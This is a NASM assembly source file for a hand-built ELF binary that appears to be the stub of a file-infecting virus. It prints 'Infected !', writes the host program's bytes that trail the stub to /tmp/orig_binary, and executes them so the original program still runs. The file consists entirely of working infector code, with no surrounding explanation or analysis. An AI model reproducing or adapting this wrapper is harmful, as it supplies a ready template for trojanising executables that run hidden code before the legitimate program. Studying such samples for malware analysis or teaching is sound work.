%define SIZE 6768
%define WRITE 1
%define OPEN 2
%define CLOSE 3
%define EXECVE 59

BITS 64
ORG 0x400000

elf64_header:
db  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00  ; e_ident
db  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  ; e_ident
dw  0x2                                             ; e_type
dw  0x3e                                            ; e_machine
dd  0x1                                             ; e_version
dq  entry_point                                     ; e_entry
dq  ph - $$                                         ; e_phoff
dq  sh - $$                                         ; e_shoff
dd  0x0                                             ; e_flags
dw  end_header - elf64_header                       ; e_ehsize
dw  end_ph - ph                                     ; e_phentsize
dw  0x1                                             ; e_phnum
dw  64                                              ; e_shentsize
dw  0x3                                             ; e_shnum
dw  0x2                                             ; e_shstrndx
end_header:

sh:
dd  0
dd  0
dq  0
dq  0
dq  0
dq  0
dd  0
dd  0
dq  0
dq  0

text:
dd  strtext - strtab                                ; sh_name
dd  1                                               ; sh_type
dq  3                                               ; sh_flags
dq  entry_point                                     ; sh_addr
dq  entry_point - $$                                ; sh_offset
dq  end - entry_point + SIZE                        ; sh_size
dd  0                                               ; sh_link
dd  0                                               ; sh_info
dq  16                                              ; sh_addralign
dq  0                                               ; sh_entsize
end_text:

dd  1                                               ; sh_name
dd  3                                               ; sh_type
dq  0                                               ; sh_flags
dq  0                                               ; sh_addr
dq  strtab - $$                                     ; sh_offset
dq  end_strtab - strtab                             ; sh_size
dd  0                                               ; sh_link
dd  0                                               ; sh_info
dq  1                                               ; sh_addralign
dq  0                                               ; sh_entsize
end_sh:

strtab:
db  0, ".shstrtab", 0
strtext:
db  ".text", 0
end_strtab:

ph:
; first segment
dd  0x1                                             ; p_type (loadable segment)
dd  0x5                                             ; p_flags (R-X)
dq  entry_point - $$                                ; p_offset
dq  entry_point                                     ; p_vaddr
dq  entry_point                                     ; p_paddr
dq  end - entry_point + SIZE                        ; p_filesz
dq  end - entry_point + SIZE                        ; p_memsz
dq  0x200000                                        ; p_align
end_ph:

entry_point:
mov     rax, WRITE
mov     rdi, 1
mov     rsi, str
mov     rdx, end - str
syscall

mov     rax, OPEN
mov     rdi, file
mov     rsi, 578                                    ; O_RDWR|O_CREAT|O_TRUNC
mov     rdx, 111o
syscall

mov     rdi, rax
mov     rax, 1
mov     rsi, end
mov     rdx, SIZE
syscall

mov     rax, CLOSE
syscall

mov     rax, EXECVE
mov     rdi, file
xor     rdx, rdx
push    rdx
push    rdi
mov     rsi, rsp
syscall

file:
db  "/tmp/orig_binary", 0

str:
db  "Infected !", 0xa
end: